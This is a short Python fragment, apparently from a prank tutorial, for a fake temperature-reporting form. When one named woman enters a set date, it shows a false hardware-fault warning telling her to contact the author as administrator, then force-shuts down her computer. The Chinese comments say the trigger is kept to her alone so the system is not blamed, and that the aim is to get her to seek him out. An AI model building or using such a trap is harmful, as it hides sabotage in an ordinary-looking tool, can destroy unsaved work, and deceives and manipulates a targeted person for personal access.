...
if fieldValues[0] == "目标姓名":  # 要专门针对她来设计出错，否则别人都该说是你搞的破系统了
    if fieldValues[2] == "20200302":  # 设置系统出问题的时间，最好设置为发给她的两天后
        msg = g.msgbox(msg="您的电脑存在故障请重试，无法填报请联系管理员：（联系方式）", title="警告！", ok_button="ok")  # 告诉他要联系你解决
        time.sleep(5)  # 留5秒钟让她记下来
        os.system('shutdown -s -f -t 5')  # 5秒后自动关机！
    # 内心：我电脑怎么回事啊？怎么自动关机了？我得杀个毒了！
    # 内心：算了，还是直接找管理员吧！趁这个机会看看他啥样！
else:
    msg = g.msgbox(msg="感谢您的填写，祝您生活愉快", title="XXXX工作室体温填报系统", ok_button="ok")  # 正常状态运行
